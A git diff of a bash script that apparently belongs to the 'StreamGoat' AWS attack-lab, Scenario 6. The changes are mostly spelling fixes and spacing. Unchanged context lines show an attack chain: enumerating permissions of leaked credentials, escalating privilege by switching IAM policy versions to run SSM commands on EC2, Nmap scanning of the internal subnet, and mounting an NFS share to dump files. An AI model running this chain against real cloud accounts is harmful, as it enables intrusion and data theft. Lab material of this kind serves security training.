@@ -45,12 +45,12 @@ spin_stop() { [ -n "${SPIN_PID}" ] && kill "${SPIN_PID}" >/dev/null 2>&1 || true
 banner() {
   printf "%s%s%s\n" "${BOLD}${CYAN}" "===            StreamGoat - Scenario 6              ===" "${RESET}"
   printf "%sThis automated attack script will:%s\n" "${GREEN}" "${RESET}"
-  printf "  • Step 1. Configuring aws credentials\n"
+  printf "  • Step 1. Configuring AWS credentials\n"
   printf "  • Step 2. Permission enumeration for leaked credentials\n"
   printf "  • Step 3. Inspecting IAM policies for compromised user\n"
-  printf "  • Step 4. Switching between policy version to get command execution\n"
-  printf "  • Step 5. Internal network recon with nmap\n"
-  printf "  • Step 6. Mount and explore discovered NFS share and sensitive data exfiltration\n"
+  printf "  • Step 4. Switching between policy versions to gain command execution\n"
+  printf "  • Step 5. Internal network reconnaissance with Nmap\n"
+  printf "  • Step 6. Mounting and exploring the discovered NFS share and exfiltrating sensitive data\n"
   
 }
 banner
@@ -67,9 +67,9 @@ done
 
 read -r -p "Everything is prepared. Press Enter to start (or Ctrl+C to abort)..." _ || true
 #############################################
-# Step 1. Configuring aws credentials
+# Step 1. Configuring AWS credentials
 #############################################
-printf "%s%s%s\n" "${BOLD}${CYAN}" "===  Step 1. Configuring aws credentials to use awscli  ===" "${RESET}"
+printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 1. Configuring AWS credentials to use awscli  ===" "${RESET}"
 is_valid_keys() {
   local key="$1" secret="$2" token="${3:-}" region="${4:-us-east-1}"
   local rc=0 out
@@ -108,12 +108,12 @@ while :; do
     err "Not valid keys. STS validation via ${YELLOW}'aws sts get-caller-identity'${RESET} failed"
   fi
 done
-
-read -r -p "Step 1 is complited. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
+printf "\n"
+read -r -p "Step 1 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
 #############################################
 # Step 2. Permission enumeration for leaked credentials
 #############################################
-printf "%s%s%s\n" "${BOLD}${CYAN}" "===  Step 2. Permission enumeration for leaked credentials  ===" "${RESET}"
+printf "\n%s%s%s\n\n" "${BOLD}${CYAN}" "===  Step 2. Permission enumeration for leaked credentials  ===" "${RESET}"
 
 # init colors (portable)
 
@@ -149,12 +149,13 @@ try "RDS DescribeDBs"       aws rds describe-db-instances --max-records 20 --pro
 try "Logs DescribeLogGroups" aws logs describe-log-groups --limit 5 --profile "$PROFILE"
 try "CloudTrail DescribeTrails" aws cloudtrail describe-trails --profile "$PROFILE"
 
-printf "\nOK, it seems our permissions aren't very good. Let's try to get some more info about our user...\n"
-read -r -p "Step 2 is complited. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
+printf "\nOK, it seems our permissions are quite limited. Let's try to get some more info about our user...\n"
+printf "\n"
+read -r -p "Step 2 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
 #############################################
 # Step 3. Inspecting IAM policies for compromised user
 #############################################
-printf "%s%s%s\n\n" "${BOLD}${CYAN}" "===  Step 3. Inspecting IAM policies for compromised user  ===" "${RESET}"
+printf "\n%s%s%s\n\n" "${BOLD}${CYAN}" "===  Step 3. Inspecting IAM policies for compromised user  ===" "${RESET}"
 
 # 1. Get current IAM username
 USERNAME=$(aws iam get-user --profile "$PROFILE" --query 'User.UserName' --output text 2>/dev/null)
@@ -204,7 +205,7 @@ if [ -n "$ATTACHED_POLICY_ARNs" ]; then
       --version-id "$default" \
       --profile "$PROFILE" \
       --output json | jq '.PolicyVersion.Document'
-
+    printf "\n"
     read -r -p "Looks interesting. We have more than one version of attached policy and have permissions to switch. Lets check configuration of other versions. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
 
     # Loop over versions, skipping the default
@@ -224,11 +225,12 @@ else
   info "(none)"
 fi
 printf "\nBased on what we see above we may switch to version 2, get the list of EC2, and using version 3 executing commands on them. Lets try...\n"
-read -r -p "Step 3 is complited. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
+printf "\n"
+read -r -p "Step 3 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
 #############################################
-# Step 4. Switching between policy version to get command execution
+# Step 4. Switching between policy versions to gain command execution
 #############################################
-printf "%s%s%s\n" "${BOLD}${CYAN}" "===  Step 4. Escalation via policy version switching  ===" "${RESET}"
+printf "\n%s%s%s\n\n" "${BOLD}${CYAN}" "===  Step 4. Escalation via policy version switching  ===" "${RESET}"
 
 # Attached policy ARN (we already fetched earlier in step 3 loop)
 # If you stored it in $arn, reuse it; otherwise resolve here:
@@ -299,13 +301,14 @@ else
   err "SSM command execution failed"
 fi
 
-printf "\nGood result! No we can pivote into the network and try to collect information about local netowrk.\n"
-read -r -p "Step 4 is complited. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
+printf "\nGood result! No we can pivot into the network and try to collect information about local network.\n"
+printf "\n"
+read -r -p "Step 4 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
 
 #############################################
-# Step 5. Internal network recon with nmap
+# Step 5. Internal network reconnaissance with Nmap
 #############################################
-printf "%s%s%s\n" "${BOLD}${CYAN}" "===  Step 5. Internal subnet scanning with Nmap ===" "${RESET}"
+printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 5. Internal subnet scanning with Nmap ===" "${RESET}"
 
 # 1. Determine local subnet (via SSM command)
 step "Detecting EC2 local subnet"
@@ -384,13 +387,13 @@ else
   err "No host found with port 2049 open. Exiting."
   exit 1
 fi
-
-read -r -p "Step 5 complited. Press Enter to proceed..." _ || true
+printf "\n"
+read -r -p "Step 5 completed. Press Enter to proceed..." _ || true
 
 #############################################
 # Step 6. Mount and explore discovered NFS share
 #############################################
-printf "%s%s%s\n" "${BOLD}${CYAN}" "===  Step 6. Mounting NFS and dumping files ===" "${RESET}"
+printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 6. Mounting NFS and dumping files ===" "${RESET}"
 
 # Use the IP discovered with port 2049 open
 MOUNT_DIR="/mnt/nfs"
@@ -459,5 +462,6 @@ for file in $FILENAMES; do
   echo -e "\n${YELLOW}[FILE: $file]${RESET}\n$FILE_CONTENT\n"
 done
 
-printf "\nWe got access to sensitive data stored in internal EFS.\n"
-read -r -p "Scenario 6 complited. Press Enter to finish..." _ || true
+printf "We got access to sensitive data stored in internal EFS.\n"
+printf "\n"
+read -r -p "Scenario 6 completed. Press Enter to finish..." _ || true
